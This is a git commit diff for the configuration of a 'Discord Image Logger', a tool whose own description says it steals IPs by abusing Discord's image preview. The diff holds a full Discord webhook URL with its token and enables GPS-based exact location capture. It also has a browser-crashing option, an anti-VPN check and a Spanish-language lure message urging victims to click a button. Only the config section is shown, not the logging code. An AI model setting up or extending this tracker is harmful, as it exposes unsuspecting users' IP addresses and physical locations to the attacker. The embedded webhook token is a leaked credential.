8dccc66dc5dc660e1e243636b4b7d86fdf7dcacb
Markikosa21 <125832168+Markikosa21@users.noreply.github.com>
2025-09-12 23:19:00 +0200

    Update discord.py

--- api/discord.py
+++ api/discord.py
@@ -6,31 +6,30 @@ import traceback, requests, base64, httpagentparser
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "unknown"
+__author__ = "kzen"
 
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1346069432115531838/-my41vBPI8QZP8udUboUzVMa5gtW61nkv4LSYU5jEwyGZKixXxuYyS7YCCqnxLDYO5sV",
-    "image": "https://tenor.com/es/view/skid-can't-code-skidder-steals-code-code-stealer-gif-3656702310176110883", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
-
+    "image": "https://tenor.com/es/view/skid-can't-code-skidder-steals-code-code-stealer-gif-3656702310176110883", 
+                                              
+    "imageArgument": True, 
     # CUSTOMIZATION #
-    "username": "Kzen!", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "Kzen!",
+    "color": 0x00FFFF, 
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": False, 
     
-    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, 
 
-    "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "verificate dandole al boton de abajo", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+    "message": { 
+        "doMessage": False,
+        "message": "verificate dandole al boton de abajo", 
+        "richMessage": True, 
     },
 
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
+    "vpnCheck": 1, 
                 # 0 = No Anti-VPN
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
